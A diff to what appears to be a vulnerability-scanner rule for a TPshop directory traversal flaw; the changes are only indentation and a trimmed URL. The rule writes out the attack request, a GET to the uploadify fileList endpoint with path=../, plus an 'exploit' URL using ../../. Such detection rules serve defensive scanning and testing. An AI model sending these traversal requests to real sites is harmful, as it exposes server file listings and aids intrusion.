@@ -3,7 +3,7 @@ rules:
   - method: GET
     path: /index.php/Home/uploadify/fileList?type=.+&path=../
     headers:
-        Accept-Encoding: 'deflate'
+      Accept-Encoding: 'deflate'
     follow_redirects: false
     expression: |
       response.status == 200 && response.body.bcontains(bytes(string("\"state\":\"SUCCESS\""))) && response.body.bcontains(bytes(string("total")))
@@ -12,6 +12,6 @@ detail:
   influence_version: 'TPshop'
   links:
     - https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
-    - http://www.tp-shop.cn/
+    - http://www.tp-shop.cn
   exploit:
     - https://localhost/index.php/Home/uploadify/fileList?type=.+&path=../../
